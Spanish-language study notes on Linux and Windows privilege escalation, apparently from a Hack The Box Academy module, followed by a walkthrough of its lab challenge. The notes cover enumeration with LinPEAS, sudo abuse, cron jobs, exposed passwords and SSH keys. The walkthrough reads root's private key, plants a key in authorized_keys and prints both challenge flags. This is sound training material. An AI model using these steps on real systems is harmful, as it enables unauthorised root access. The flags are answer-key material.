## **ESCALANDO PRIVILEGIOS**

Nuestro acceso inicial a un servidor remoto suele ser en el contexto de un usuario con privilegios bajos, lo que no nos daría acceso completo sobre la box. Para obtener acceso completo, necesitaremos encontrar una vulnerabilidad interna/local que aumente nuestros privilegios al usuario `root` en Linux o al usuario `administrador/SYSTEM` en Windows. Analicemos algunos métodos comunes para escalar nuestros privilegios. 

___

### PRIVESC CHECKISTS

Una vez que obtengamos el acceso inicial a una box, queremos enumerarlo a fondo para encontrar posibles vulnerabilidades que podamos explotar para lograr un nivel de privilegio más alto. Podemos encontrar muchas checklist y hojas de trucos en línea que tienen una colección de verificaciones que podemos ejecutar y los comandos para ejecutar estas verificaciones. Un excelente recurso es [HackTricks](https://book.hacktricks.xyz/), que tiene una excelente lista de verificación para la escalada de privilegios locales de Linux y Windows. Otro repositorio excelente es [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), que también tiene listas de verificación para Linux y Windows. Debemos comenzar a experimentar con varios comandos y técnicas y familiarizarnos con ellos para comprender múltiples debilidades que pueden conducir a escalar nuestros privilegios. 

___

### SCRIPTS DE ENUMERACION

Muchos de los comandos anteriores pueden ejecutarse automáticamente con un script para revisar el informe y buscar cualquier debilidad. Podemos ejecutar muchos scripts para enumerar automáticamente el servidor mediante la ejecución de comandos comunes que devuelvan cualquier hallazgo interesante. Algunos de los scripts de enumeración comunes de Linux incluyen [LinEnum](https://github.com/rebootuser/LinEnum.git) y [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), y para Windows incluyen [Seatbelt](https://github.com/GhostPack/Seatbelt) y [JAWS](https://github.com/411Hall/JAWS).

Otra herramienta útil que podemos usar para la enumeración de servidores es [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), ya que está bien mantenida para mantenerse actualizada e incluye secuencias de comandos para enumerar tanto Linux como Windows. 

>Nota: Estos scripts ejecutarán muchos comandos conocidos por identificar vulnerabilidades y crearán mucho "ruido" que puede activar software antivirus o software de monitoreo de seguridad que busca este tipo de eventos. Esto puede evitar que se ejecuten los scripts o incluso activar una alarma de que el sistema se ha visto comprometido. En algunos casos, es posible que queramos hacer una enumeración manual en lugar de ejecutar scripts. 

Tomemos un ejemplo de ejecución del script de Linux de `PEASS` llamado `LinPEAS`:

~~~
Juceco@htb[/htb]$ ./linpeas.sh
...SNIP...

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEYEND:
  RED/YELLOW: 99% a PE vector
  RED: You must take a look at it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMangenta: Your username


====================================( Basic information )=====================================
OS: Linux version 3.9.0-73-generic
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...SNIP...
~~~

Como podemos ver, una vez que se ejecuta el script, comienza a recopilar información y mostrarla en un excelente informe. Analicemos algunas de las vulnerabilidades que debemos buscar en el resultado de estos scripts. 
___

### KERNEL EXPLOITS

Siempre que nos encontremos con un servidor que ejecuta un sistema operativo antiguo, debemos comenzar por buscar posibles vulnerabilidades del kernel que puedan existir. Supongamos que el servidor no se mantiene con las últimas actualizaciones y parches. En ese caso, es probable que sea vulnerable a vulnerabilidades específicas del kernel que se encuentran en versiones sin parches de Linux y Windows. 

Por ejemplo, el script anterior nos mostró que la versión de Linux es `3.9.0-73-genérica`. Si buscamos en Google exploits para esta versión o usamos `searchsploit`, encontraríamos un `CVE-2016-5195`, también conocido como `DirtyCow`. Podemos buscar y descargar el exploit [DirtyCow](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs) y ejecutarlo en el servidor para obtener acceso de root.

El mismo concepto también se aplica a Windows, ya que hay muchas vulnerabilidades en versiones anteriores o sin parches de Windows, con varias vulnerabilidades que se pueden usar para escalar privilegios. Debemos tener en cuenta que los exploits del kernel pueden causar inestabilidad en el sistema y debemos tener mucho cuidado antes de ejecutarlos en los sistemas de producción. Lo mejor es probarlos en un entorno de laboratorio y solo ejecutarlos en sistemas de producción con aprobación y coordinación explícitas con nuestro cliente. 
___
### SOSFTWARE VULNERABLE

Otra cosa que debemos buscar es el software instalado. Por ejemplo, podemos usar el comando `dpkg -l` en Linux o buscar en `C:\Program Files` en Windows para ver qué software está instalado en el sistema. Deberíamos buscar exploits públicos para cualquier software instalado, especialmente si hay versiones anteriores en uso que contengan vulnerabilidades sin parchear. 

___
### PRIVILEGIOS DE USUARIO

Otro aspecto crítico a tener en cuenta después de obtener acceso a un servidor son los privilegios disponibles para el usuario al que tenemos acceso. Supongamos que se nos permite ejecutar comandos específicos como root (o como otro usuario). En ese caso, es posible que podamos escalar nuestros privilegios a los usuarios root/system u obtener acceso como un usuario diferente. A continuación se presentan algunas formas comunes de explotar ciertos privilegios de usuario: 

1. sudo
2. SUID
3. Windows Token Privileges

El comando `sudo` en Linux permite que un usuario ejecute comandos como un usuario diferente. Por lo general, se usa para permitir que los usuarios con menos privilegios ejecuten comandos como root sin darles acceso al usuario root. Esto generalmente se hace porque los comandos específicos solo se pueden ejecutar como root como `tcpdump` o permitir que el usuario acceda a ciertos directorios solo de root. Podemos comprobar qué privilegios sudo tenemos con el comando `sudo -l`:

~~~
$ sudo -l

[sudo] password for user1:
...SNIP...

User user1 may run the following commands on ExampleServer:
    (ALL : ALL) ALL
~~~

El resultado anterior dice que podemos ejecutar todos los comandos con `sudo`, lo que nos da acceso completo, y podemos usar el comando `su` con `sudo` para cambiar al usuario `root`: 

~~~
$ sudo su -

[sudo] password for user1:
whoami
root
~~~

El comando anterior requiere una contraseña para ejecutar cualquier comando con `sudo`. Hay ciertas ocasiones en las que se nos puede permitir ejecutar ciertas aplicaciones, o todas las aplicaciones, sin tener que proporcionar una contraseña: 

~~~
$ sudo -l

    (user : user) NOPASSWD: /bin/echo
~~~

La entrada `NOPASSWD` muestra que el comando `/bin/echo` se puede ejecutar sin contraseña. Esto sería útil si obtuviéramos acceso al servidor a través de una vulnerabilidad y no tuviéramos la contraseña del usuario. Como dice `user`, podemos ejecutar `sudo` como ese usuario y no como root. Para hacerlo, podemos especificar el usuario con `-u user`: 

~~~
$ sudo -u user /bin/echo Hello World!

    Hello World!
~~~

Una vez que encontramos una aplicación en particular que podemos ejecutar con `sudo`, podemos buscar formas de explotarla para obtener un shell como usuario root. [GTFOBins](https://gtfobins.github.io/) contiene una lista de comandos y cómo se pueden explotar a través de sudo. Podemos buscar la aplicación sobre la que tenemos privilegios de sudo y, si existe, puede decirnos el comando exacto que debemos ejecutar para obtener acceso de root utilizando el privilegio de sudo que tenemos. 

[LOLBAS](https://lolbas-project.github.io/#) también contiene una lista de aplicaciones de Windows que podemos aprovechar para realizar ciertas funciones, como descargar archivos o ejecutar comandos en el contexto de un usuario privilegiado. 
___

### TRAREAS PROGRAMADAS

Tanto en Linux como en Windows, existen métodos para que los scripts se ejecuten a intervalos específicos para realizar una tarea. Algunos ejemplos son la ejecución de un análisis antivirus cada hora o un script de copia de seguridad que se ejecuta cada 30 minutos. Normalmente hay dos formas de aprovechar las tareas programadas (Windows) o los trabajos cron (Linux) para escalar nuestros privilegios: 

1. Agregar nuevo scheduled tasks/cron jobs
2. Engañarlos para que ejecuten un software malicioso 

La forma más sencilla es comprobar si se nos permite añadir nuevas tareas programadas. En Linux, una forma común de mantener tareas programadas es a través de `Cron Jobs`. Hay directorios específicos que podemos utilizar para agregar nuevos trabajos cron si tenemos los permisos de escritura sobre ellos. Éstos incluyen: 


1. `/etc/crontab`
2. `/etc/cron.d`
3. `/var/spool/cron/crontabs/root`

Si podemos escribir en un directorio llamado por un `cron job`, podemos escribir un script bash con un comando de `reverse shell`, que debería enviarnos un `reverse shell` cuando se ejecute. 
___

### CREDENCIALES EXPUESTOS

A continuación, podemos buscar archivos que podamos leer y ver si contienen alguna credencial expuesta. Esto es muy común con archivos de configuración, archivos de registro y archivos de historial de usuario (`bash_history` en Linux y `PSReadLine` en Windows). Los scripts de enumeración que discutimos al principio generalmente buscan posibles contraseñas en los archivos y nos las proporcionan, como se muestra a continuación: 

~~~
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
~~~

Como podemos ver, se expone la contraseña de la base de datos `password123`, lo que nos permitiría iniciar sesión en las bases de datos `mysql` locales y buscar información interesante. También podemos verificar `password reuse`, ya que el usuario del sistema puede haber usado su contraseña para las bases de datos, lo que puede permitirnos usar la misma contraseña para cambiar a ese usuario, de la siguiente manera:

~~~
$ su -

Password: password123
whoami

root
~~~

También podemos usar las credenciales de usuario `ssh` para acceder al servidor como ese usuario. 

___
### SSH KEYS

Finalmente, analicemos las claves SSH. Si tenemos acceso de lectura sobre el directorio `.ssh` para un usuario específico, podemos leer sus claves ssh privadas que se encuentran en `/home/user/.ssh/id_rsa` o `/root/.ssh/id_rsa`, y usarlas para iniciar sesión en el servidor. Si podemos leer el directorio `/root/.ssh/` y podemos leer el archivo `id_rsa`, podemos copiarlo en nuestra máquina y usar el indicador `-i` para iniciar sesión con él: 

~~~
Juceco@htb[/htb]$ vim id_rsa
Juceco@htb[/htb]$ chmod 600 id_rsa
Juceco@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa

root@remotehost#
~~~

>Tenga en cuenta que usamos el comando `chmod 600 id_rsa` en la clave después de crearla en nuestra máquina para cambiar los permisos del archivo para que sea más restrictivo. Si las claves ssh tienen permisos laxos, es decir, tal vez leídas por otras personas, el servidor ssh evitaría que funcionen. 

Si nos encontramos con acceso de escritura a un directorio `users/.ssh/`, podemos colocar nuestra clave pública en el directorio ssh del usuario en `/home/user/.ssh/authorized_keys`. Esta técnica generalmente se usa para obtener acceso `ssh` después de obtener un shell como ese usuario. La configuración actual de SSH no aceptará claves escritas por otros usuarios, por lo que solo funcionará si ya tenemos control sobre ese usuario. Primero debemos crear una nueva clave con `ssh-keygen` y el indicador `-f` para especificar el archivo de salida: 

~~~
$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+
~~~

Esto nos dará dos archivos: `key` (que usaremos con `ssh -i`) y `key.pub`, que copiaremos a la máquina remota. Copiemos `key.pub`, luego en la máquina remota, lo agregaremos a `/root/.ssh/authorized_keys`:

~~~
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
~~~

Ahora, el servidor remoto debería permitirnos iniciar sesión como ese usuario usando nuestra clave privada: 

~~~
Juceco@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 
~~~

Como podemos ver, ahora podemos entrar como usuario root. Los módulos [Linux Privilege Escalation](https://academy.hackthebox.com/module/details/51) y [the Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67) brindan más detalles sobre cómo usar cada uno de estos métodos para la Escalada de privilegios, y muchos otros también. 

___
### RETO
+ SSH en el servidor anterior con las credenciales proporcionadas y use '-p xxxxxx' para especificar el puerto que se muestra arriba. Una vez que inicie sesión, intente encontrar una manera de moverse a 'usuario2', para obtener la bandera en '/home/user2/flag.txt' 

+ Una vez que obtenga acceso a 'usuario2', intente encontrar una manera de escalar sus privilegios a la raíz, para obtener el indicador en '/root/flag.txt'. 

~~~
$ ssh user1@139.59.176.69 -p31157

The authenticity of host '[138.68.180.98]:32305 ([138.68.180.98]:32305)' can't be established.
ED25519 key fingerprint is SHA256:KDcF5lg81jNEGgdr67bEo+Ui1pmsyHXKnw/ZHPLZCyY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '[138.68.180.98]:32305' (ED25519) to the list of known hosts.
(user1@138.68.180.98) Password: 
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

user1@gettingstartedprivesc-423812-646697d759-wtj9q:~$
~~~

~~~
user1@gettingstartedprivesc-423812-646697d759-wtj9q:~$ sudo -l
Matching Defaults entries for user1 on
    gettingstartedprivesc-423812-646697d759-wtj9q:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user1 may run the following commands on
        gettingstartedprivesc-423812-646697d759-wtj9q:
    (user2 : user2) NOPASSWD: /bin/bash
~~~

~~~
user1@gettingstartedprivesc-423812-646697d759-wtj9q:~$ sudo -u user2 /bin/bash

user2@gettingstartedprivesc-423812-646697d759-wtj9q:/home$ cd user2
user2@gettingstartedprivesc-423812-646697d759-wtj9q:~$ cat /home/user2/flag.txt
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
~~~

para la segunda pregunta debemos descargar el [linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/latest) y correrlo para enumerar las vulnerabilidades por supuesto lo que debemos hacer es crear un archivo con `vim` donde copiaremos todo lo que esta en el archivo descargado de `linpeas`

~~~
user1@gettingstartedprivesc-423812-646697d759-7dtnj:~$ vim linpeas.sh
user1@gettingstartedprivesc-423812-646697d759-7dtnj:~$ sudo -u user2 /bin/bash
user2@gettingstartedprivesc-423812-646697d759-7dtnj:/home/user1$ /bin/bash ./linpeas.sh
~~~

recordemos que lo unico que puede hacer user2 es ejecutar archivos con bash ejecutamos el linpeas.sh con el comando `/bin/bash ./linpeas.sh`

~~~
...SNIP...
╔══════════╣ Analyzing SSH Files (limit 70)                                       
                                                                                  
-rw-r--r-- 1 root root 2602 Feb 12  2021 /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt3nX57B1Z2nSHY+aaj4lKt9lyeLVNiFh7X0vQisxoPv9BjNppQxV
... SNIP ...
7v0aCqLbhyFZBQ9WdyAMU/DKiZRM6knckt61TEL6ffzToNS+sQu0GSh6EYzdpUfevwKL+a
QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
-----END OPENSSH PRIVATE KEY-----
-rw-r--r-- 1 root root 571 Feb 12  2021 /root/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3edfnsHVnadIdj5pqPiUq32XJ4tU2IWHtfS9CKzGg+/0GM2mlDFU+1Dxyy8er8Zq2BKjyhXKyRkhFtZvtC8JAjsmxP4+viJ5BrI0igObr6L0XWFfIxzRWwCo
... SNIP ...
/vBiBhenYaGP4bA9yPYiLh+rKdEU/V+zLrOhKM30L3vuEKHklK1Pop/Qh0zrwFwc= root@76d91fe5c270
...SNIP...
~~~

De toda la informacion y vulnerabilidades tomaremos en cuenta la de la conexion SSH porque nos permitira logearnos como root, tenemos en este caso la llave privada lo unico que tenemos que hacer es copiar ese codigo en un archivo de nombre id_rsa, por supuesto esto lo tenemos que hacer desde nuestra pc, para luego volver a ingresar

~~~
┌──(kali㉿kali)-[/home/kali]
└─$ vim id_rsa
~~~

tiene que ir toda la informacion incluso ` -----BEGIN OPENSSH PRIVATE KEY-----` y ` -----END OPENSSH PRIVATE KEY----- `

ahora ingresaremos con esta llave de la siguiente forma

~~~
                                                                             
┌──(kali㉿kali)-[/home/kali]
└─$ ssh root@139.59.176.69 -p31157 -i id_rsa
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@gettingstartedprivesc-423812-646697d759-k8xqr:~# ls
flag.txt
root@gettingstartedprivesc-423812-646697d759-k8xqr:~# cat flag.txt
HTB{pr1v1l363_35c4l4710n_2_r007}
~~~